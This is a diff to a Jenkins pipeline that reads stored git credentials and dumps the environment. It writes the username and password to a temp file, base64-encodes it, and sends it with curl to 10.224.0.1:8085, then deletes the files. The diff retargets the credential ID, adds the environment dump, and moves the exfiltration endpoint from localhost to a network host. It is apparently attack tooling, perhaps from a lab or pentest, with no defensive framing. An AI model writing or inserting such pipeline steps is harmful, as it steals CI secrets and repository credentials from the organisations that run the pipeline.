@@ -1,6 +1,9 @@
 agent {
   stages {
-   	withCredentials([usernamePassword(credentialsId: 'USER', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {
+   	withCredentials([usernamePassword(credentialsId: 'GIT', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {
+
+      	sh '''env
+        '''
 
 		sh '''echo "[+] USER:" > /tmp/file
 		      echo "$USERNAME" >> /tmp/file
@@ -8,7 +11,7 @@ agent {
 		      echo >> /tmp/file
 		'''
 		sh '''base64 /tmp/file > /tmp/out
-		      curl -d @/tmp/out http://localhost:8085
+		      curl -d @/tmp/out http://10.224.0.1:8085
 		      rm /tmp/file
 		      rm /tmp/out
 		'''
